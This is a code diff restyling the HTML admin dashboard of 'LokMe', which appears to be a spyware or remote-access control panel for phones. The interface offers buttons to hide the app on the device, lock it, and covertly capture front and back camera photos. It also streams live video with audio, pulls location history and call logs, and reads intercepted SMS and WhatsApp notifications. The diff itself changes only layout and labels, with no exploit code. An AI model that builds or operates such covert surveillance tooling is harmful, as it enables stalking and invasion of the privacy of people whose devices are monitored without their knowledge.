@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>LokMe - Admin Dashboard</title>
+  <title>LokMe — Admin Dashboard</title>
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <link rel="stylesheet" href="style.css" />
 </head>
@@ -18,33 +18,56 @@
     <!-- Sidebar -->
     <aside class="sidebar" id="sidebar">
       <div class="logo">
-        <div class="logo-text">
+        <div class="logo-icon">L</div>
+        <div>
           <h2>LokMe</h2>
-          <span>Admin Panel</span>
+          <span>Admin Dashboard</span>
         </div>
       </div>
+
       <nav>
-        <button class="nav-btn active" data-section="devices">Devices</button>
-        <button class="nav-btn" data-section="commands">Commands</button>
-        <button class="nav-btn" data-section="calllogs">Call Logs</button>
-        <button class="nav-btn" data-section="notifications">Notifications</button>
-        <button class="nav-btn" data-section="photos">Photos</button>
-        <button class="nav-btn" data-section="storage">Storage</button>
+        <div class="nav-section-label">Monitor</div>
+        <button class="nav-btn active" data-section="devices">
+          <span class="nav-icon">&#9679;</span> Devices
+        </button>
+        <button class="nav-btn" data-section="notifications">
+          <span class="nav-icon">&#9993;</span> Notifications
+        </button>
+
+        <div class="nav-section-label">Data</div>
+        <button class="nav-btn" data-section="calllogs">
+          <span class="nav-icon">&#9742;</span> Call Logs
+        </button>
+        <button class="nav-btn" data-section="photos">
+          <span class="nav-icon">&#128247;</span> Photos
+        </button>
+        <button class="nav-btn" data-section="commands">
+          <span class="nav-icon">&#9881;</span> Commands
+        </button>
+
+        <div class="nav-section-label">System</div>
+        <button class="nav-btn" data-section="storage">
+          <span class="nav-icon">&#128451;</span> Storage
+        </button>
       </nav>
-      <div class="sidebar-stats" id="sidebarStats"></div>
-      <div class="server-status">
-        <span id="wsStatus" class="status-dot disconnected"></span>
-        <span id="wsLabel">Disconnected</span>
+
+      <div class="sidebar-footer">
+        <div class="server-status">
+          <span id="wsStatus" class="status-dot disconnected"></span>
+          <span id="wsLabel">Disconnected</span>
+        </div>
       </div>
     </aside>
 
     <!-- Main Content -->
     <main class="content">
-      <!-- Devices Section -->
+      <!-- ===== DEVICES SECTION ===== -->
       <section id="sec-devices" class="section active">
         <div class="section-header">
           <h1>Devices</h1>
-          <button class="btn btn-primary" onclick="refreshDevices()">Refresh</button>
+          <div class="header-actions">
+            <button class="btn btn-secondary" onclick="refreshDevices()">&#8635; Refresh</button>
+          </div>
         </div>
         <div id="deviceList" class="card-grid"></div>
 
@@ -52,36 +75,39 @@
         <div id="deviceDetail" class="hidden">
           <div class="section-header">
             <h2 id="detailTitle">Device</h2>
-            <div style="display:flex;gap:8px">
-              <button class="btn btn-danger" onclick="deleteAllDeviceData()">Delete All Data</button>
-              <button class="btn btn-danger" onclick="deleteDevice()">Delete Device</button>
-              <button class="btn btn-secondary" onclick="showDeviceList()">Back</button>
+            <div class="header-actions">
+              <button class="btn btn-outline btn-sm" onclick="deleteDeviceNotifications()">Clear Notifs</button>
+              <button class="btn btn-outline btn-sm" onclick="deleteDeviceCallLogs()">Clear Calls</button>
+              <button class="btn btn-outline btn-sm" onclick="deleteDevicePhotos()">Clear Photos</button>
+              <button class="btn btn-outline btn-sm" onclick="deleteDeviceLocations()">Clear Locations</button>
+              <button class="btn btn-danger btn-sm" onclick="deleteAllDeviceData()">Delete All Data</button>
+              <button class="btn btn-secondary btn-sm" onclick="showDeviceList()">&#8592; Back</button>
             </div>
           </div>
 
           <!-- Command Buttons -->
           <div class="command-bar">
-            <button class="btn btn-danger" onclick="sendCommand('LOCK_DEVICE')">Lock Device</button>
-            <button class="btn btn-primary" onclick="promptDialog()">Send Dialog</button>
-            <button class="btn btn-primary" onclick="sendCommand('GET_LOCATION')">Get Location</button>
-            <button class="btn btn-primary" onclick="sendCommand('GET_CALL_LOG')">Get Call Log</button>
-            <button class="btn btn-primary" onclick="capturePhoto(false)">Capture Back</button>
-            <button class="btn btn-primary" onclick="capturePhoto(true)">Capture Front</button>
-            <button class="btn btn-danger" onclick="sendCommand('HIDE_APP')">Hide App</button>
-            <button class="btn btn-primary" onclick="sendCommand('SHOW_APP')">Show App</button>
+            <button class="btn btn-danger" onclick="sendCommand('LOCK_DEVICE')">&#128274; Lock</button>
+            <button class="btn btn-primary" onclick="promptDialog()">&#128172; Dialog</button>
+            <button class="btn btn-primary" onclick="sendCommand('GET_LOCATION')">&#128204; Location</button>
+            <button class="btn btn-primary" onclick="sendCommand('GET_CALL_LOG')">&#9742; Call Log</button>
+            <button class="btn btn-primary" onclick="capturePhoto(false)">&#128247; Photo Back</button>
+            <button class="btn btn-primary" onclick="capturePhoto(true)">&#128247; Photo Front</button>
+            <button class="btn btn-secondary" onclick="sendCommand('HIDE_APP')">&#128064; Hide</button>
+            <button class="btn btn-primary" onclick="sendCommand('SHOW_APP')">&#128065; Show</button>
           </div>
 
           <!-- Live Video Stream -->
           <div class="data-section" id="videoSection">
             <div class="section-subheader">
-              <h3>Live Video + Audio Stream</h3>
-              <div style="display:flex;gap:8px;align-items:center">
-                <label style="color:#aaa;font-size:13px;display:flex;align-items:center;gap:4px">
+              <h3>Live Stream</h3>
+              <div class="header-actions">
+                <label style="color:var(--text-sec);font-size:13px;display:flex;align-items:center;gap:6px;cursor:pointer">
                   <input type="checkbox" id="audioToggle" checked /> Audio
                 </label>
-                <button class="btn btn-primary btn-sm" onclick="startVideoStream(false)">Start Back Camera</button>
-                <button class="btn btn-primary btn-sm" onclick="startVideoStream(true)">Start Front Camera</button>
-                <button class="btn btn-danger btn-sm" onclick="stopVideoStream()">Stop Stream</button>
+                <button class="btn btn-primary btn-sm" onclick="startVideoStream(false)">Back Camera</button>
+                <button class="btn btn-primary btn-sm" onclick="startVideoStream(true)">Front Camera</button>
+                <button class="btn btn-danger btn-sm" onclick="stopVideoStream()">Stop</button>
               </div>
             </div>
             <div id="videoContainer" class="video-container">
@@ -89,7 +115,6 @@
               <img id="videoFeed" class="video-feed hidden" alt="Live Feed" />
               <div id="videoInfo" class="video-info hidden">
                 <span id="videoCameraLabel"></span>
-                <span id="videoFpsLabel"></span>
               </div>
             </div>
           </div>
@@ -98,99 +123,115 @@
           <div id="map" class="map-container"></div>
           <div id="locationInfo" class="info-bar hidden"></div>
 
-          <!-- Device Data Management -->
+          <!-- Call Logs (device) -->
           <div class="data-section">
             <div class="section-subheader">
               <h3>Call Logs</h3>
-              <button class="btn btn-danger btn-sm" onclick="deleteDeviceCallLogs()">Clear All</button>
             </div>
             <div id="commandHistory" class="table-container"></div>
           </div>
 
+          <!-- Photos (device) -->
           <div class="data-section">
             <div class="section-subheader">
               <h3>Device Photos</h3>
-              <button class="btn btn-danger btn-sm" onclick="deleteDevicePhotos()">Clear All</button>
             </div>
             <div id="devicePhotos" class="photo-grid"></div>
           </div>
 
+          <!-- Notifications (device) -->
           <div class="data-section">
             <div class="section-subheader">
-              <h3>Notifications (SMS / WhatsApp)</h3>
-              <button class="btn btn-danger btn-sm" onclick="deleteDeviceNotifications()">Clear All</button>
+              <h3>Notifications</h3>
             </div>
             <div id="deviceNotifications" class="table-container"></div>
           </div>
 
+          <!-- Location History (device) -->
           <div class="data-section">
             <div class="section-subheader">
               <h3>Location History</h3>
-              <button class="btn btn-danger btn-sm" onclick="deleteDeviceLocations()">Clear All</button>
             </div>
             <div id="deviceLocations" class="table-container"></div>
           </div>
         </div>
       </section>
 
-      <!-- Commands Section -->
-      <section id="sec-commands" class="section">
-        <div class="section-header">
-          <h1>All Commands</h1>
-          <div style="display:flex;gap:8px">
-            <button class="btn btn-danger" onclick="clearAllCommands()">Clear All</button>
-            <button class="btn btn-primary" onclick="refreshAllCommands()">Refresh</button>
-          </div>
-        </div>
-        <div id="allCommands" class="table-container"></div>
-      </section>
-
-      <!-- Call Logs Section -->
-      <section id="sec-calllogs" class="section">
-        <div class="section-header">
-          <h1>Call Logs</h1>
-          <div style="display:flex;gap:8px">
-            <button class="btn btn-danger" onclick="clearAllCallLogs()">Clear All</button>
-            <button class="btn btn-primary" onclick="refreshCallLogs()">Refresh</button>
-          </div>
-        </div>
-        <div id="callLogsList" class="table-container"></div>
-      </section>
-
-      <!-- Notifications Section -->
+      <!-- ===== NOTIFICATIONS SECTION ===== -->
       <section id="sec-notifications" class="section">
         <div class="section-header">
-          <h1>Notifications (SMS / WhatsApp)</h1>
-          <div style="display:flex;gap:8px">
+          <div>
+            <h1>Notifications</h1>
+            <p style="color:var(--text-ter);font-size:13px;margin-top:4px">SMS, WhatsApp, and other messaging apps</p>
+          </div>
+          <div class="header-actions">
             <button class="btn btn-danger" onclick="clearAllNotifications()">Clear All</button>
-            <button class="btn btn-primary" onclick="refreshNotifications()">Refresh</button>
+            <button class="btn btn-secondary" onclick="refreshNotifications()">&#8635; Refresh</button>
           </div>
         </div>
         <div id="notifList" class="table-container"></div>
       </section>
 
-      <!-- Photos Section -->
+      <!-- ===== CALL LOGS SECTION ===== -->
+      <section id="sec-calllogs" class="section">
+        <div class="section-header">
+          <div>
+            <h1>Call Logs</h1>
+            <p style="color:var(--text-ter);font-size:13px;margin-top:4px">Incoming, outgoing, and missed calls</p>
+          </div>
+          <div class="header-actions">
+            <button class="btn btn-danger" onclick="clearAllCallLogs()">Clear All</button>
+            <button class="btn btn-secondary" onclick="refreshCallLogs()">&#8635; Refresh</button>
+          </div>
+        </div>
+        <div id="callLogsList" class="table-container"></div>
+      </section>
+
+      <!-- ===== PHOTOS SECTION ===== -->
       <section id="sec-photos" class="section">
         <div class="section-header">
-          <h1>Photos</h1>
-          <div style="display:flex;gap:8px">
-            <button class="btn btn-danger" onclick="clearAllPhotos()">Delete All Photos</button>
-            <button class="btn btn-primary" onclick="refreshPhotos()">Refresh</button>
+          <div>
+            <h1>Photos</h1>
+            <p style="color:var(--text-ter);font-size:13px;margin-top:4px">All captured photos from all devices</p>
+          </div>
+          <div class="header-actions">
+            <button class="btn btn-danger" onclick="clearAllPhotos()">Delete All</button>
+            <button class="btn btn-secondary" onclick="refreshPhotos()">&#8635; Refresh</button>
           </div>
         </div>
         <div id="photoGrid" class="photo-grid"></div>
       </section>
 
-      <!-- Storage Section -->
+      <!-- ===== COMMANDS SECTION ===== -->
+      <section id="sec-commands" class="section">
+        <div class="section-header">
+          <div>
+            <h1>Command History</h1>
+            <p style="color:var(--text-ter);font-size:13px;margin-top:4px">All commands sent to all devices</p>
+          </div>
+          <div class="header-actions">
+            <button class="btn btn-danger" onclick="clearAllCommands()">Clear All</button>
+            <button class="btn btn-secondary" onclick="refreshAllCommands()">&#8635; Refresh</button>
+          </div>
+        </div>
+        <div id="allCommands" class="table-container"></div>
+      </section>
+
+      <!-- ===== STORAGE SECTION ===== -->
       <section id="sec-storage" class="section">
         <div class="section-header">
-          <h1>Storage & Data Management</h1>
-          <button class="btn btn-primary" onclick="refreshStats()">Refresh</button>
+          <div>
+            <h1>Storage &amp; Data</h1>
+            <p style="color:var(--text-ter);font-size:13px;margin-top:4px">System-wide statistics and data management</p>
+          </div>
+          <div class="header-actions">
+            <button class="btn btn-secondary" onclick="refreshStats()">&#8635; Refresh</button>
+          </div>
         </div>
         <div id="storageStats" class="stats-grid"></div>
         <div class="danger-zone">
-          <h3>Danger Zone</h3>
-          <p>Permanently delete all data from the database. This cannot be undone.</p>
+          <h3>&#9888; Danger Zone</h3>
+          <p>Permanently delete all devices and their data from the database. This cannot be undone.</p>
           <button class="btn btn-danger" onclick="nukeAllData()">Delete ALL Data</button>
         </div>
       </section>
@@ -199,10 +240,10 @@
       <div id="confirmModal" class="modal hidden">
         <div class="modal-content">
           <h3 id="confirmTitle">Are you sure?</h3>
-          <p id="confirmMessage" style="color:#aaa;margin-bottom:16px"></p>
+          <p id="confirmMessage" style="color:var(--text-sec);margin-bottom:16px;font-size:14px"></p>
           <div class="modal-actions">
             <button class="btn btn-secondary" onclick="closeConfirm()">Cancel</button>
-            <button class="btn btn-danger" id="confirmBtn" onclick="">Delete</button>
+            <button class="btn btn-danger" id="confirmBtn">Delete</button>
           </div>
         </div>
       </div>
@@ -210,7 +251,7 @@
       <!-- Dialog Modal -->
       <div id="dialogModal" class="modal hidden">
         <div class="modal-content">
-          <h3>Send Dialog to Device</h3>
+          <h3>Send Dialog</h3>
           <input type="text" id="dialogTitle" placeholder="Title" value="Alert" />
           <textarea id="dialogMessage" placeholder="Message..." rows="3"></textarea>
           <div class="modal-actions">
@@ -220,7 +261,7 @@
         </div>
       </div>
 
-      <!-- Response Toast -->
+      <!-- Toast -->
       <div id="toast" class="toast hidden"></div>
     </main>
   </div>
